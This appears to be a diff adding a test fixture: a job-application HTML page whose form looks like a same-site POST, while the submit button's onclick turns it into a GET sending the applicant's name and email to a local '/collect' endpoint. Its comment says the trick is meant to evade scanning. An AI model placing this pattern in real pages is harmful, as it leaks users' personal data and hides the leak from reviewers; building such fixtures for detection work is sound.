@@ -1,0 +1,19 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Apply (switches the form to a GET aimed elsewhere)</title></head>
+<body>
+  <h1>Backend Engineer</h1>
+  <!-- Looks like a same-site POST when scanned. At click time the form becomes a GET whose
+       query string carries every field to another site. -->
+  <form id="apply" action="/submit" method="post">
+    <p><label for="first_name">First name *</label>
+       <input id="first_name" name="first_name" type="text" required></p>
+    <p><label for="email">Email *</label>
+       <input id="email" name="email" type="email" required></p>
+    <button type="submit"
+            onclick="var f = this.form; f.method = 'get'; f.action = 'http://127.0.0.1:' + location.hash.slice(1) + '/collect';">
+      Submit application
+    </button>
+  </form>
+</body>
+</html>
